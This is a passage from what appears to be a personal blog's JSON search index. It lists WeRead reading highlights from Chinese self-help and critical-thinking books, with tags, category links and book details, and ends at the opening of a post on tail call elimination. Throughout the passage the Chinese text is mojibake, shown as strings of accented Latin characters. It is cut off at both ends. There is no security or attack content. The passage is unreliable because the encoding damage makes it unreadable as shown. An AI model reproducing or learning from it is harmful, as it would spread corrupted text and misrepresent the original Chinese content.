è¯·å†™é€å­—ç¨¿ 3 è¯·å†™é€å­—ç¨¿ å–æ³•å…¶ä¸Šå¾—å…¶ä¸­ â€” åˆ›å»ºäº [[2021-10-06]] 23:53 ^30-1220-1227 ç”¨æ­£ç¡®çš„æ–¹æ³•åšäº‹ï¼å–æ³•å…¶ä¸Šï¼Œå¾—ä¹å…¶ä¸­ 4 å¦‚ä½•å¼€å§‹ï¼šæ˜¯æ´å¯Ÿè¿˜æ˜¯è´Ÿé¢æƒ…ç»ªï¼Ÿ 4 å¦‚ä½•å¼€å§‹ï¼šæ˜¯æ´å¯Ÿè¿˜æ˜¯è´Ÿé¢æƒ…ç»ªï¼Ÿ å®Œæˆæ¯”å®Œç¾é‡è¦ â€” åˆ›å»ºäº [[2021-10-06]] 23:59 ^31-1333-1340 5 è®²æ•…äº‹ä¹Ÿæ˜¯ä¸€ç§ä»·å€¼è§‚ 5 è®²æ•…äº‹ä¹Ÿæ˜¯ä¸€ç§ä»·å€¼è§‚ è„±å£ç§€ä¸€å®šæ˜¯è®²ä»·å€¼è§‚çš„ï¼Œè®²æ•…äº‹ã€è®²ç”Ÿæ´»è¶£äº‹ä¹Ÿæ˜¯ä¸€ç§ä»·å€¼è§‚â€”â€”ä½ è®¤ä¸ºè¿™æ ·çš„ç”Ÿæ´»æ˜¯å€¼å¾—æˆ–è€…ä¸å€¼å¾—è¿‡çš„ã€‚ â€” åˆ›å»ºäº [[2021-10-07]] 00:00 ^32-726-775 9 å°æƒ…å¢ƒä¸å¤§æƒ…å¢ƒ 9 å°æƒ…å¢ƒä¸å¤§æƒ…å¢ƒ æ¯å¤©ç¡è§‰å‰å”¯ä¸€è¦è€ƒå¯Ÿçš„åªæœ‰ä¸€ä»¶äº‹ï¼šä½ æœ‰æ²¡æœ‰æŒç»­åœ°å˜å¥½ï¼Ÿä»Šå¤©æ˜¯å¦è·å¾—äº†ä¸€ç‚¹æ˜¨å¤©æ²¡æœ‰çš„ä¸œè¥¿ï¼Ÿè¿™æ˜¯æŸ¥ç†Â·èŠ’æ ¼çš„å»ºè®®ï¼Œäº‹å®ä¸Šæˆ‘çœ‹å¾ˆå¤šä¼˜ç§€çš„äººåœ¨è¯»åˆ°è¿™ä¸ªå»ºè®®å‰å°±æ˜¯è¿™ä¹ˆåšçš„ã€‚ â€” åˆ›å»ºäº [[2021-10-08]] 23:55 ^36-2953-3034 3 è¯·å†™é€å­—ç¨¿ å–æ³•å…¶ä¸Šå¾—å…¶ä¸­ â€” åˆ›å»ºäº [[2021-10-06]] 23:54 ^291189470-7tRjj6ww7 ç”¨æ­£ç¡®çš„æ–¹æ³•åšäº‹ï¼å–æ³•å…¶ä¸Šï¼Œå¾—ä¹å…¶ä¸­","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ä¸ªäººæˆé•¿","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/"}]},{"title":"å­¦ä¼šæé—®ï¼ˆåŸä¹¦ç¬¬12ç‰ˆï¼‰","date":"2024-08-31T01:35:29.201Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿/å­¦ä¼šæé—®ï¼ˆåŸä¹¦ç¬¬12ç‰ˆï¼‰-å°¼å°”Â·å¸ƒæœ— æ–¯å›¾å°”ç‰¹Â·åŸºåˆ©/","text":"ä½œè€…ï¼šå°¼å°”Â·å¸ƒæœ— æ–¯å›¾å°”ç‰¹Â·åŸºåˆ© - å†…å®¹ç®€ä»‹ ã€Šå­¦ä¼šæé—®ï¼ˆåŸä¹¦ç¬¬12ç‰ˆï¼‰ã€‹ æœ¬ä¹¦ç‰¹åˆ«é€‚åˆåœ¨ä»¥ä¸‹å‡ ä¸ªé¢†åŸŸä¸­åº”ç”¨ã€‚é€šè¯†è¯¾ç¨‹çš„è€å¸ˆåœ¨ç¬¬ä¸€å ‚è¯¾ä¸Šï¼Œé¢å¯¹å­¦ç”Ÿå…³äºä»–ä»¬èƒ½ä»è¿™é—¨è¯¾ä¸­å­¦åˆ°ä»€ä¹ˆçš„ç–‘é—®ï¼Œå¯ä»¥è®©å­¦ç”Ÿé˜…è¯»æœ¬ä¹¦ï¼Œè¿™å°†ä¸ºä»–ä»¬çš„é—®é¢˜æä¾›æ¸…æ™°æ˜äº†çš„ç­”æ¡ˆã€‚è‹±è¯­è€å¸ˆåœ¨è¯¾å ‚ä¸Šè®­ç»ƒå­¦ç”Ÿå†™ä½œè¯´æ˜æ–‡æ—¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æœ¬ä¹¦ï¼Œä¸ä»…å¯ä»¥å°†å…¶ä½œä¸ºæ„æ€æ–‡ç« å‰è¯„ä¼°å„ç§ä¸åŒè®ºç‚¹çš„èŒƒæœ¬ï¼Œè¿˜å¯ä»¥å°†å…¶ä½œä¸ºå†™ä½œè¿‡ç¨‹ä¸­åº”é¿å…çš„é—®é¢˜çš„æ£€æŸ¥æ¸…å•ã€‚æœ¬ä¹¦è¿˜å¯ä»¥ç”¨ä½œæ—¨åœ¨åŸ¹å…»å­¦ç”Ÿæ‰¹åˆ¤æ€§é˜…è¯»å’Œæ€è€ƒæŠ€èƒ½çš„è¯¾ç¨‹ä¸­çš„æ ¸å¿ƒææ–™ã€‚ å­¦ä¼šæé—®ï¼ˆåŸä¹¦ç¬¬12ç‰ˆï¼‰ + ã€Šå­¦ä¼šæé—®ï¼ˆåŸä¹¦ç¬¬12ç‰ˆï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN 9787111680925 ä½œè€… å°¼å°”Â·å¸ƒæœ— æ–¯å›¾å°”ç‰¹Â·åŸºåˆ© å‡ºç‰ˆå¹´ 2021-05-01 å‡ºç‰ˆç¤¾ æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾ æ¥æº å­¦ä¼šæé—®ï¼ˆåŸä¹¦ç¬¬12ç‰ˆï¼‰ åˆ†ç±» ä¸ªäººæˆé•¿-æ²Ÿé€šè¡¨è¾¾ é«˜äº®åˆ’çº¿ ä¸“å®¶è¯´å¾—å†åŠ¨å¬ï¼Œä¹Ÿä¸ä¸€å®šé å¾—ä½ ä¸“å®¶è¯´å¾—å†åŠ¨å¬ï¼Œä¹Ÿä¸ä¸€å®šé å¾—ä½ æˆ‘ä»¬å€¾å¬ä»–ä»¬ï¼Œæ˜¯ä¸ºäº†æ„å»ºå‡ºè‡ªå·±çš„ç­”æ¡ˆï¼Œè€Œä¸æ˜¯å¬äº†ä»–ä»¬çš„è¯ä»¥åï¼Œé©¬ä¸Šå°±æŒ‰ä»–ä»¬è¯´çš„å»åšï¼Œå¥½åƒè‡ªå·±æ˜¯åªæ— åŠ©çš„ç¾”ç¾Šï¼Œæˆ–è€…æ˜¯ä¸ªç‰µçº¿çš„æœ¨å¶ã€‚ â€” åˆ›å»ºäº [[2022-03-07]] 18:12 ^118-1428-1492 é å¤§è„‘ç†æ€§æ€è€ƒ é å¤§è„‘ç†æ€§æ€è€ƒ æ‰¹åˆ¤æ€§æ€ç»´é¼“åŠ±ä½ å€¾å¬ä»–äººï¼Œå‘åˆ«äººå­¦ä¹ ï¼ŒåŒæ—¶æ‚é‡åˆ«äººæ‰€è¯´çš„è¯ï¼Œçœ‹çœ‹å®ƒä»¬çš„åˆ†é‡å¦‚ä½•ã€‚å¦‚æ­¤ï¼Œä½ å°†äº†è§£åˆ°æˆ‘ä»¬å¿…é¡»è¦ä¾èµ–ä»–äººï¼Œä½†åˆä¸èƒ½æ¥è€…ä¸æ‹’ï¼Œå¿…é¡»åšå‡ºé€‰æ‹© â€” åˆ›å»ºäº [[2022-03-07]] 18:15 ^119-550-623 æ¿€å‘ä½ çš„æ‰¹åˆ¤æ€§æ€ç»´ æ¿€å‘ä½ çš„æ‰¹åˆ¤æ€§æ€ç»´ æ‰¹åˆ¤æ€§æ€ç»´ï¼ˆcritical thinkingï¼‰è¿™ä¸€æœ¯è¯­ï¼ŒæŒ‡ç”±ä»¥ä¸‹ä¸‰ä¸ªç»´åº¦æ¿€æ´»çš„è¯„ä¼°æŠ€èƒ½ï¼š1ï¼‰æ„è¯†åˆ°ä¸€æ•´å¥—ç¯ç¯ç›¸æ‰£çš„æ‰¹åˆ¤æ€§é—®é¢˜ï¼›2ï¼‰æœ‰èƒ½åŠ›åœ¨é€‚å½“æ—¶æœºä»¥é€‚å½“æ–¹å¼æå‡ºå¹¶å›ç­”è¿™äº›é—®é¢˜ï¼›3ï¼‰æœ‰ç§¯æä¸»åŠ¨åœ°ä½¿ç”¨è¿™äº›æ‰¹åˆ¤æ€§é—®é¢˜çš„å¼ºçƒˆæ¸´æœ›ã€‚ â€” åˆ›å»ºäº [[2022-03-07]] 18:15 ^120-593-793 ä»·å€¼è§‚å½±å“äººä¸äººä¹‹é—´çš„äº’åŠ¨ ä»·å€¼è§‚å½±å“äººä¸äººä¹‹é—´çš„äº’åŠ¨ æˆ‘ä»¬æœ€å¸¸è§çš„å€¾å‘å°±æ˜¯åªæ„¿å¬é‚£äº›ä»·å€¼è§‚å€¾å‘å’Œæˆ‘ä»¬ç›¸ä¼¼çš„äººçš„è¯ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹å¤§åŠ›æ°”å»æŠµåˆ¶è¿™ç§å€¾å‘ã€‚æˆ‘ä»¬å¿…é¡»è¦ä¸è¿™ç§å€¾å‘åšæ–—äº‰ã€‚ â€” åˆ›å»ºäº [[2022-03-07]] 18:38 ^123-1898-1958 è®©å¯¹è¯æœ‰æ•ˆè¿›è¡Œä¸‹å» è®©å¯¹è¯æœ‰æ•ˆè¿›è¡Œä¸‹å» å¥½å¥‡å¿ƒå†å¼ºï¼Œä¹Ÿè¦è¡¨ç°å¾—ä½“è´´ä»–äººä¸”å¹³é™éšå’Œï¼Œä¸€æ—¦è®¨è®ºçš„è¯­æ°”å‡æ¸©ï¼Œä½ å°±è¦ä¸æ–­æé†’è‡ªå·±ï¼Œä½ çš„ç›®çš„æ˜¯è™šå¿ƒå­¦ä¹ ï¼Œè€Œä¸æ˜¯èˆŒæˆ˜ç¾¤è‹±ã€‚ â€” åˆ›å»ºäº [[2022-03-07]] 21:57 ^124-1842-1901 è®©å¯¹è¯æœ‰æ•ˆè¿›è¡Œä¸‹å» è¡¨æƒ…å’ŒåŠ¨ä½œéƒ½è¦è¡¨ç°å‡ºè°¦æ­çš„æ ·å­ï¼Œä¸è¦æ‘†å‡ºä¸€å‰¯å…¨çŸ¥å…¨èƒ½ã€ç›®ç©ºä¸€åˆ‡çš„æ¶åŠ¿ã€‚ â€” åˆ›å»ºäº [[2022-03-07]] 21:58 ^124-1930-1965","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ä¸ªäººæˆé•¿","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/"}]},{"title":"åˆ»æ„ç»ƒä¹ ï¼šå¦‚ä½•ä»æ–°æ‰‹åˆ°å¤§å¸ˆ","date":"2024-08-31T01:35:29.199Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿/åˆ»æ„ç»ƒä¹ ï¼šå¦‚ä½•ä»æ–°æ‰‹åˆ°å¤§å¸ˆ-å®‰å¾·æ–¯Â·è‰¾åˆ©å…‹æ£® ç½—ä¼¯ç‰¹Â·æ™®å°”/","text":"ä½œè€…ï¼šå®‰å¾·æ–¯Â·è‰¾åˆ©å…‹æ£® ç½—ä¼¯ç‰¹Â·æ™®å°” - å†…å®¹ç®€ä»‹ ã€Šåˆ»æ„ç»ƒä¹ ï¼šå¦‚ä½•ä»æ–°æ‰‹åˆ°å¤§å¸ˆã€‹ æœ¬ä¹¦æ˜¯ä¸¤ä½ä½œè€…åˆä½œæ’°å†™çš„ï¼Œä¸€ä½æ˜¯å¿ƒç†å­¦å®¶ï¼Œå¦ä¸€ä½æ˜¯ç§‘å­¦ä½œå®¶ã€‚10å¤šå¹´å‰ï¼Œæˆ‘ä»¬å¼€å§‹ç»å¸¸æ¢è®¨æ°å‡ºäººç‰©å’Œâ€œåˆ»æ„ç»ƒä¹ â€è¿™ä¸ªä¸»é¢˜ï¼Œå¹¶åœ¨5å¹´å‰å¼€å§‹è®¤çœŸåœ°å›´ç»•è¿™ä¸ªä¸»é¢˜å†™ä¹¦ã€‚åœ¨é‚£æ®µæ—¶é—´ï¼Œæœ¬ä¹¦åœ¨æˆ‘ä»¬ä¸¤äººçš„æ€æƒ³ç¢°æ’ä¸­æ…¢æ…¢æˆå½¢ï¼Œä»¥è‡³äºæˆ‘ä»¬ç°åœ¨éƒ½éš¾ä»¥åˆ†è¾¨ï¼Œä¹¦ä¸­çš„å“ªä¸€éƒ¨åˆ†è§‚ç‚¹ç”±è°æå‡ºã€‚æˆ‘ä»¬åªçŸ¥é“ï¼Œæœ¬ä¹¦ç”±æˆ‘ä»¬ä¸¤äººåˆå†™ï¼Œæ¯”ç”±æˆ‘ä»¬å•ç‹¬å»å†™è¦å¥½å¾—å¤šï¼Œä¹Ÿå®Œå…¨ä¸åŒã€‚ åˆ»æ„ç»ƒä¹ ï¼šå¦‚ä½•ä»æ–°æ‰‹åˆ°å¤§å¸ˆ + ã€Šåˆ»æ„ç»ƒä¹ ï¼šå¦‚ä½•ä»æ–°æ‰‹åˆ°å¤§å¸ˆã€‹ å±æ€§ å†…å®¹ ISBN 9787111551287 ä½œè€… å®‰å¾·æ–¯Â·è‰¾åˆ©å…‹æ£® ç½—ä¼¯ç‰¹Â·æ™®å°” å‡ºç‰ˆå¹´ 2016-11-01 å‡ºç‰ˆç¤¾ æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾ æ¥æº åˆ»æ„ç»ƒä¹ ï¼šå¦‚ä½•ä»æ–°æ‰‹åˆ°å¤§å¸ˆ åˆ†ç±» ä¸ªäººæˆé•¿-äººç”Ÿå“²å­¦ é«˜äº®åˆ’çº¿ å¼•è¨€ å¤©æ‰å­˜åœ¨å— å¼•è¨€ å¤©æ‰å­˜åœ¨å— å¼•è¨€ å¤©æ‰å­˜åœ¨å—ä¸ºä»€ä¹ˆæœ‰äº›äººå¯¹ä»–ä»¬æ‰€åšçš„äº‹æƒ…å¦‚æ­¤æ“…é•¿ï¼Œæ“…é•¿åˆ°ä»¤äººä¸å¯æ€è®®çš„åœ°æ­¥ï¼Ÿä¸è®ºä½ è§‚å¯Ÿå“ªä¸ªè¡Œä¸šæˆ–é¢†åŸŸï¼Œä»ç«æŠ€ä½“è‚²ã€éŸ³ä¹è¡¨æ¼”ï¼Œåˆ°ç§‘å­¦ç•Œã€åŒ»å­¦ç•Œå’Œå•†ä¸šç•Œï¼Œä¼¼ä¹æ€»æœ‰å‡ ä¸ªéåŒå‡¡å“çš„äººï¼Œè®©æˆ‘ä»¬å¯¹ä»–ä»¬èƒ½åšçš„äº‹æƒ…ä»¥åŠæ°å‡ºçš„ç¨‹åº¦æ„Ÿåˆ°ç‚«ç›®ã€‚å½“æˆ‘ä»¬é‡åˆ°ä¸€ä¸ªå¦‚æ­¤éåŒå‡¡å“çš„äººæ—¶ï¼Œå¾€å¾€è‡ªç„¶è€Œç„¶åœ°è®¤ä¸ºï¼Œè¿™ä¸ªäººç”Ÿæ¥å°±æ¯”åˆ«äººä¼˜ç§€ã€‚æˆ‘ä»¬ç»å¸¸è¯´ï¼Œâ€œä»–çœŸçš„å¾ˆæœ‰å¤©èµ‹â€ï¼Œæˆ–è€…â€œå¥¹æ˜¯çœŸæ­£çš„å¤©æ‰â€ã€‚ â€” åˆ›å»ºäº [[2023-09-13]] 23:24 ^92-339-549","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ä¸ªäººæˆé•¿","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/"}]},{"title":"ä¸‰åˆ†åšäº‹ ä¸ƒåˆ†åšäººï¼ˆå…¨é›†ï¼‰","date":"2024-08-31T01:35:29.195Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿/ä¸‰åˆ†åšäº‹ ä¸ƒåˆ†åšäººï¼ˆå…¨é›†ï¼‰-é™ˆç²/","text":"ä½œè€…ï¼šé™ˆç² - å†…å®¹ç®€ä»‹ ã€Šä¸‰åˆ†åšäº‹ ä¸ƒåˆ†åšäººï¼ˆå…¨é›†ï¼‰ã€‹ äººçš„ä¸€ç”Ÿæ— éè¦ç”¨è‡ªå·±çš„å®é™…è¡ŒåŠ¨å›ç­”ä¸¤ä¸ªé—®é¢˜ï¼šä¸€æ˜¯å¦‚ä½•åšäº‹ï¼›äºŒæ˜¯å¦‚ä½•åšäººã€‚äººåšå¥½äº†ï¼Œäº‹åŠåŠŸå€ã€‚äººæ²¡åšå¥½ï¼Œäº‹å€åŠŸåŠã€‚ä¸€ä¸ªå…‰ä¼šåšäº‹çš„äººå¾€å¾€æ˜¯ä¸èƒ½æˆ–åŠŸçš„ã€‚ä¸€ä¸ªå…‰ä¼šåšäººçš„å…¥ä¹Ÿæ— æ³•å–å¾—å¤§æˆå°±ã€‚æ‰€ä»¥è¯´ï¼Œå†³å®šäººç”Ÿæˆè´¥çš„ä¸‰åˆ†åœ¨åšäº‹ï¼Œä¸ƒåˆ†åœ¨åšäººã€‚çœŸæ­£çš„æˆåŠŸè€…æ— ä¸æ·±è°™æ—¢ä¼šåšäº‹ã€åˆä¼šåšäººçš„å¥¥å¦™çœŸè°›ï¼Œæ‰€ä»¥æ‰èƒ½è¾¾åˆ°æ— ä½è€Œä¸èƒœçš„é«˜è¶…å¢ƒç•Œã€‚ ä¸‰åˆ†åšäº‹ ä¸ƒåˆ†åšäººï¼ˆå…¨é›†ï¼‰ + ã€Šä¸‰åˆ†åšäº‹ ä¸ƒåˆ†åšäººï¼ˆå…¨é›†ï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN 9787802284661 ä½œè€… é™ˆç² å‡ºç‰ˆå¹´ 2007-11-01 å‡ºç‰ˆç¤¾ æ–°ä¸–ç•Œå‡ºç‰ˆç¤¾ æ¥æº ä¸‰åˆ†åšäº‹ ä¸ƒåˆ†åšäººï¼ˆå…¨é›†ï¼‰ åˆ†ç±» ä¸ªäººæˆé•¿-æ²Ÿé€šè¡¨è¾¾ é«˜äº®åˆ’çº¿ 1 å¯¹å°é”™å¯äºˆè´£å¤‡ï¼Œå¯¹å¤§é”™åˆ™å°½é‡è‹¥æ— å…¶äº‹ 1 å¯¹å°é”™å¯äºˆè´£å¤‡ï¼Œå¯¹å¤§é”™åˆ™å°½é‡è‹¥æ— å…¶äº‹ å¯¹å°é”™å’Œå°é”™ï¼Œäººä»¬å¾€å¾€åœ¨æ„å¤§é”™ï¼Œå¿½è§†å°é”™ã€‚è€Œç¬¦åˆå¿ƒç†å­¦çš„ä½œæ³•åˆ™ç›¸åï¼Œå¯¹äºå°é”™ï¼Œå“ªæ€•æ˜¯ç”±äºç²—å¿ƒé€ æˆçš„æ— å…³ç´§è¦çš„é”™è¯¯ï¼Œä¹Ÿè¦ä¸¥å‰æŒ‡å‡ºï¼›è€Œå¯¹å…¶æ‰€çŠ¯çš„å¤§é”™è¯¯ï¼Œæœ€å¥½æ•…æ„è§†è€Œä¸è§ï¼Œç”šæˆ–æœ‰æ„å®‰æ…°ã€é¼“åŠ±ã€‚åªæœ‰è¿™æ ·ï¼Œå°é”™æ‰èƒ½è­¦ç¤ºäººï¼Œå¤§é”™æ‰èƒ½æ¿€åŠ±äººã€‚ â€” åˆ›å»ºäº [[2022-04-07]] 15:28 ^6-3008-3122 2 å½“å¯¹æ–¹æƒ…ç»ªæ¿€åŠ¨æ—¶ï¼Œä»¥ä»å®¹ä¸è¿«çš„æ€åº¦æ¥åº”å¯¹ 2 å½“å¯¹æ–¹æƒ…ç»ªæ¿€åŠ¨æ—¶ï¼Œä»¥ä»å®¹ä¸è¿«çš„æ€åº¦æ¥åº”å¯¹ åŒ–â€œå…´å¥‹â€ä¸ºâ€œå†·é™â€çš„å¿ƒç†æˆ˜æœ¯ï¼šä»¥å†·é™ä»å®¹çš„æ€åº¦æ‰“å‡»å¯¹æ–¹å’„å’„é€¼äººçš„æ°”åŠ¿ã€‚ç”¨å¿ƒç†å­¦è§‚ç‚¹ï¼Œå¦‚æœå¯¹æ–¹æ€’æ°”å†²å†²ï¼Œä½ è‹¥è®¤çœŸåœ°å¤§è‚†å®£æ‰¬ä½ çš„è®ºè°ƒï¼Œåè€Œä¼šæ¿€å‘å¯¹æ–¹çš„å…´å¥‹æƒ…ç»ªã€‚åä¹‹ï¼Œæ•…æ„ä»¥æ…¢è…¾è…¾çš„åŠ¨ä½œã€è¨€è¯­å»åº”å¯¹ï¼Œå¯å‰Šå¼±å¯¹æ–¹çš„æ°”åŠ¿ã€æ‰“ä¹±å¯¹æ–¹çš„é˜µè„šï¼ŒæŒæ§å±€åŠ¿ã€‚ â€” åˆ›å»ºäº [[2022-04-07]] 15:30 ^7-2861-2981 4 å…‹æœå¿ƒç†å®šåŠ¿ï¼Œåˆ‡å¿Œä»¥ç‚¹ä»£é¢ï¼Œç”¨è€çœ¼å…‰çœ‹äºº 4 å…‹æœå¿ƒç†å®šåŠ¿ï¼Œåˆ‡å¿Œä»¥ç‚¹ä»£é¢ï¼Œç”¨è€çœ¼å…‰çœ‹äºº å®šå‹æ•ˆåº”â€ï¼šæ˜¯æŒ‡äººä»¬åœ¨ä¸äººäº¤å¾€çš„è¿‡ç¨‹ä¸­ï¼Œæ˜“å—å¿ƒç†å®šåŠ¿çš„å½±å“ï¼Œæ ¹æ®äººçš„å¤–è¡¨è¡Œä¸ºç‰¹å¾ï¼Œç»“åˆè‡ªå·±å¤´è„‘ä¸­çš„å®šå‹ï¼Œå¯¹äººè¿›è¡Œå½’ç±»ï¼Œä»¥æ­¤æ¥è¯„ä»·ä¸€ä¸ªäººã€‚è¯¥æ•ˆåº”æ—¢æœ‰ç§¯æçš„ä½œç”¨ï¼Œä¹Ÿæœ‰æ¶ˆæçš„å½±å“ã€‚ä¸€æ–¹é¢å¯ä»¥ç®€åŒ–è®¤è¯†è¿‡ç¨‹ï¼Œå¦ä¸€æ–¹é¢å¯èƒ½æŸç¼šæ€ç»´ï¼Œè®©æˆ‘ä»¬åªç”¨å¸¸è§„æ–¹æ³•å»è§£å†³é—®é¢˜ï¼Œè€Œä¸æ±‚ç”¨å…¶ä»–â€œæ·å¾„â€çªç ´ã€‚ â€” åˆ›å»ºäº [[2022-04-07]] 15:38 ^9-2734-2872 5 é¿å…â€œæŠ•å°„æ•ˆåº”â€ï¼Œä¸ä»¥è‡ªå·±çš„æ ‡å‡†å»åˆ¤æ–­å¯¹æ–¹ 5 é¿å…â€œæŠ•å°„æ•ˆåº”â€ï¼Œä¸ä»¥è‡ªå·±çš„æ ‡å‡†å»åˆ¤æ–­å¯¹æ–¹ æŠ•å°„æ•ˆåº”â€ï¼Œå³åœ¨äººé™…è®¤çŸ¥è¿‡ç¨‹ä¸­ï¼Œäººä»¬æ€»æ˜¯æ½œæ„è¯†åœ°å‡è®¾ä»–äººä¸è‡ªå·±æœ‰ç›¸åŒçš„å€¾å‘ï¼ŒæŠŠè‡ªå·±çš„ç‰¹æ€§æŠ•å°„åˆ°ä»–äººèº«ä¸Šã€‚å½“åˆ«äººçš„è¡Œä¸ºä¸æˆ‘ä»¬ä¸åŒæ—¶ï¼Œæˆ‘ä»¬ä¹ æƒ¯ç”¨è‡ªå·±çš„æ ‡å‡†å»è¡¡é‡åˆ«äººçš„è¡Œä¸ºï¼Œè®¤ä¸ºåˆ«äººçš„è¡Œä¸ºè¿åå¸¸è§„ã€‚ â€” åˆ›å»ºäº [[2022-04-07]] 15:42 ^10-2463-2559","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ä¸ªäººæˆé•¿","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ä¸ªäººæˆé•¿","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E4%B8%AA%E4%BA%BA%E6%88%90%E9%95%BF/"}]},{"title":"ã€æ±‡ç¼–ã€‘Tail Call Elimination","date":"2024-08-31T01:35:29.193Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘TailCallElimination/","text":"æ¦‚è¿°ï¼šTail Call Eliminationï¼ˆå°¾è°ƒç”¨æ¶ˆé™¤ï¼‰æ˜¯ä¸€ç§ç¼–è¯‘ä¼˜åŒ–æŠ€æœ¯ï¼Œæ—¨åœ¨å‡å°‘å› å‡½æ•°è°ƒç”¨è€Œäº§ç”Ÿçš„æ ˆç©ºé—´ä½¿ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨é€’å½’è°ƒç”¨æˆ–å°¾è°ƒç”¨é¢‘ç¹çš„åœºæ™¯ä¸­ã€‚ å‚è€ƒæ–‡ç« ï¼š CodeMachine - Article - X64 Deep Dive 1. Tail Call Elimination å°¾è°ƒç”¨æ˜¯æŒ‡ä¸€ä¸ªå‡½æ•°åœ¨å…¶è¿”å›è¯­å¥ä¸­è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°ï¼Œä¸”è¯¥è°ƒç”¨æ˜¯è¯¥å‡½æ•°çš„æœ€åä¸€æ¡æŒ‡ä»¤ã€‚å°¾è°ƒç”¨æ¶ˆé™¤ï¼ˆTCOï¼‰åˆ™æ˜¯ä¸€ç§ç¼–è¯‘å™¨ä¼˜åŒ–æŠ€æœ¯ï¼Œå®ƒèƒ½å¤Ÿåœ¨ä¸å¢åŠ è°ƒç”¨æ 